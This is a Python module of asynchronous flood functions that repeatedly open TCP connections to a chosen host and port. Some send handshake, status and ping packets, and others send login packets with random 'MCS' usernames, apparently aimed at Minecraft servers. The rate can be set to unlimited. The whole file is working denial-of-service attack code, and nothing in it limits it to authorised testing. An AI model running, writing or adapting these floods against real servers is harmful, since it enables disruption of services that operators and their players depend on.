import asyncio
import random
import time

from core.levels import Stats
from utils import (
    build_handshake,
    build_login_start,
    build_ping,
    build_status_request,
    ok,
)

TCP_OVERHEAD = 200


async def _safe_connect(host, port, timeout=3.0):
    return await asyncio.wait_for(
        asyncio.open_connection(host, port), timeout=timeout
    )


async def _safe_close(writer):
    try:
        writer.close()
        await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
    except Exception:
        pass


async def _tick(rate, interval, next_tick):
    if rate <= 0:
        await asyncio.sleep(0)
        return next_tick
    next_tick += interval
    now = time.perf_counter()
    if next_tick > now:
        await asyncio.sleep(next_tick - now)
    else:
        await asyncio.sleep(0)
    return next_tick


async def tcp_connect_flood(host, port, duration, rate=20):
    mode = "unlimited" if rate <= 0 else f"{rate}/s"
    ok(f"[TCP-CONNECT] start target={host}:{port} dur={duration}s rate={mode}")
    end = time.perf_counter() + duration
    stats = Stats()
    interval = (1.0 / rate) if rate > 0 else 0.0
    next_tick = time.perf_counter()
    while time.perf_counter() < end:
        try:
            _, writer = await _safe_connect(host, port)
            await _safe_close(writer)
            stats.sent += 1
            stats.bytes_out += TCP_OVERHEAD
        except Exception:
            stats.fails += 1
        next_tick = await _tick(rate, interval, next_tick)
    stats.report("TCP-CONNECT", "conns")


async def tcp_join_flood(host, port, duration, rate=20):
    mode = "unlimited" if rate <= 0 else f"{rate}/s"
    ok(f"[TCP-JOIN] start target={host}:{port} dur={duration}s rate={mode}")
    end = time.perf_counter() + duration
    stats = Stats()
    interval = (1.0 / rate) if rate > 0 else 0.0
    next_tick = time.perf_counter()
    hs = build_handshake(host, port, next_state=1)
    sr = build_status_request()
    while time.perf_counter() < end:
        try:
            _, writer = await _safe_connect(host, port)
            ping = build_ping(random.randint(1, 100000))
            payload = hs + sr + ping
            writer.write(payload)
            await asyncio.wait_for(writer.drain(), timeout=2.0)
            await _safe_close(writer)
            stats.sent += 1
            stats.bytes_out += len(payload) + TCP_OVERHEAD
        except Exception:
            stats.fails += 1
        next_tick = await _tick(rate, interval, next_tick)
    stats.report("TCP-JOIN", "conns")


async def tcp_login_flood(host, port, duration, rate=10):
    mode = "unlimited" if rate <= 0 else f"{rate}/s"
    ok(f"[TCP-LOGIN] start target={host}:{port} dur={duration}s rate={mode}")
    end = time.perf_counter() + duration
    stats = Stats()
    interval = (1.0 / rate) if rate > 0 else 0.0
    next_tick = time.perf_counter()
    hs = build_handshake(host, port, next_state=2)
    while time.perf_counter() < end:
        try:
            _, writer = await _safe_connect(host, port)
            username = "MCS" + str(random.randint(10000, 99999))
            ls = build_login_start(username)
            payload = hs + ls
            writer.write(payload)
            await asyncio.wait_for(writer.drain(), timeout=2.0)
            await _safe_close(writer)
            stats.sent += 1
            stats.bytes_out += len(payload) + TCP_OVERHEAD
        except Exception:
            stats.fails += 1
        next_tick = await _tick(rate, interval, next_tick)
    stats.report("TCP-LOGIN", "conns")
